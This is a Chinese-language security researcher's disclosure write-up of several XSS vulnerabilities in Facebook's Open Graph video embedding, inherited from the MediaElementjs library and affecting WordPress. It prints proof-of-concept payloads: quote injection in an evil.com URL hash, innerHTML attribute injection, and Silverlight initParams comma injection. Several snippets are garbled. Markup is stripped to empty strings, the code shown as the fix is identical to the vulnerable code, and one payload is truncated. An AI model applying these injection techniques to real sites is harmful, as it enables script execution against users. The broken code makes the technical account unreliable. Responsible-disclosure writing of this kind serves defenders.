### Flash相关XSS漏洞

在以下URL中：
```
http://evil.com/video.flv#"payload
```

通过执行：
```javascript
setTimeout("log(\"http://evil.com/video.flv?\"+payload)", 0);
```

向Facebook的JavaScript发送了请求，这会导致：
```javascript
log("http://evil.com/video.flv?" + payload)
```

如果`ogVideoUrl`被设置为：
```
http://evil.com/video.flv#"+alert(document.domain+" XSSed!")+"
```

则Facebook会执行：
```javascript
log("http://evil.com/video.flv?" + alert(document.domain + " XSSed!") + "")
```

并弹出一个警告框显示“facebook.com XSSed！”。这种行为是由于不同浏览器对URL中的特殊字符编码处理方式不同：

- **Firefox**：将URL中的任何双引号（"）进行URL编码。
- **Chrome (版本64及之前)**：除了hash部分外，其他部分的双引号（"）会被URL编码。**注意**：在最新版本的Chrome 65中，这一行为已更改，现在与Firefox一致，在hash部分中的双引号也会被编码。
- **IE和Edge**：不会对hash或查询部分中的双引号（"）进行URL编码。
- **Safari**：不会对hash部分中的双引号（"）进行URL编码。

由此可见，让浏览器自行决定如何在JavaScript代码中解析URL中的特殊字符并不是一种好方法。我立即将此漏洞报告给了Facebook，他们在第二天回复称已经修改了Flash文件，不再使用`setTimeout`，而是直接发送：
```javascript
log("http://evil.com/video.flv?\"payload")
```

这样就正确地转义了双引号，从而修复了该XSS漏洞。

### 无需Flash的存储型XSS漏洞

上述XSS攻击需要依赖Flash，因此我还检查了是否存在不使用Flash的payload。当`ogVideoType`设置为“video / vimeo”时，会执行如下代码：
```javascript
ogVideoUrl = absolutizeUrl(ogVideoUrl);
ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);
playerDiv.innerHTML = '';
```

可以看到，`absolutizeUrl(ogURL)`并未经过URL编码便被注入到了`playerDiv.innerHTML`中。所以，如果将`ogVideoUrl`设为：
```
http://evil.com/#" onload="alert(document.domain)"
```

那么`playerDiv.innerHTML`就会变成：
```html
<div id="playerDiv" onload="alert(document.domain)"></div>
```

再次导致了Facebook上的XSS漏洞。我在前一个XSS漏洞修复当天也报告了这个问题，Facebook当天即通过修改代码修复了该漏洞：
```javascript
ogVideoUrl = absolutizeUrl(ogVideoUrl);
ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);
playerDiv.innerHTML = ''; // 修改后的代码
```

### 其他类型的XSS漏洞

当我继续研究时，发现当`ogVideoType`为未知类型如“video / nothing”时，Facebook会显示一条包含`ogVideoUrl`链接的错误消息：
```javascript
errorDiv.innerHTML = '';
```

若将`ogVideoUrl`设置为：
```
https://opnsec.com/#">`
```

则会产生另一个XSS漏洞。我同样将此问题报告给了Facebook，并得到了来自白帽黑客Neil的积极反馈，他表示会在次日检查相关代码。

### Silverlight相关的XSS漏洞

另外一种可能的`ogVideoType`是“silverlight”。[Silverlight](https://www.microsoft.com/silverlight/) 是微软的浏览器插件，可以与VBScript交互，类似于Flash与JavaScript的关系。Facebook托管的silverlight文件（silverlightmediaelement.xap）加载方式如下：
```javascript
params = ["file=" + ogVideoUrl, "id=playerID"];
silverlightDiv.innerHTML = '';
```

silverlightmediaelement.xap会向Facebook的JavaScript发送日志信息，但这次只包含了player ID，这是通过initParams传递给Facebook定义的一个参数。Silverlight调用JavaScript函数`[id]_init()`，其中[id]为“playerID”。

在Silverlight中，参数之间不是由URL或Flash中的&符号分隔，而是使用逗号（,）。如果`ogVideoUrl`包含逗号，则逗号之后的所有内容都会被视为额外的参数。例如，使用如下payload：
```
https://opnsec.com/#,id=alert(document.domain)&
```

silverlight将会这样加载：
```javascript
silverlightDiv.innerHTML = '';
```

此时，Silverlight仅考虑第一个出现的id，并将其值设置为`alert(document.domain)&`，然后调用如下JavaScript：
```javascript
alert(document.domain)&_init()
```

从而触发又一次XSS攻击。我同一天提交了这个漏洞报告，Neal回复说他们将移除所有MediaElement组件，并采用新的外部视频处理方式来替代它。

### WordPress的影响

以上提到的所有存在安全问题的代码并非由Facebook开发，而是来源于用于嵌入网页视频的开源库[MediaElementjs](http://www.mediaelementjs.com/)。尤其是WordPress在处理[短代码](https://codex.wordpress.org/Shortcode_API)时默认使用了这个库。这些漏洞同样存在于WordPress中，允许攻击者在评论或文章中写入存储型XSS（尽管WordPress不允许作者角色执行JavaScript）。

我向WordPress报告了这些问题，几个月前我已经报告过[其他漏洞](https://opnsec.com/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/)。他们通知了MediaElementjs团队，并告知正在进行修复工作。最终，在2018年2月，所有与MediaElementjs相关的XSS漏洞均得到了修复。

### 结论

通过这次经历，我学到了很多东西，并发现这些漏洞非常有趣。希望你也觉得有意思！

以下是一些建议：
- Open Graph（以及类似json-ld的替代方案）是在网站上展示丰富外部内容的好方法，但在使用时要小心潜在的安全风险（如SSRF、XSS和Clickjacking）。
- 不要让浏览器在JavaScript代码中为您解析URL。每个浏览器都有自己的处理方式，并且其行为可能会随时改变（例如从Chrome 64到65的变化）。建议改用白名单正则表达式。
- 当前自动工具无法检测到涉及XHR、DOM突变和外部内容的复杂动态XSS。因此即使是最安全、最有影响力的网站也可能受到攻击。定期进行代码审查和调试是预防此类问题的有效手段。
- 面对庞大且经过压缩的动态JavaScript源码不必感到畏惧。如果您发现了某些潜在危险的功能，请仔细检查其实现方式。
- Facebook WhiteHat是一个非常优秀的漏洞奖励计划！感谢Neal及其团队的支持与合作。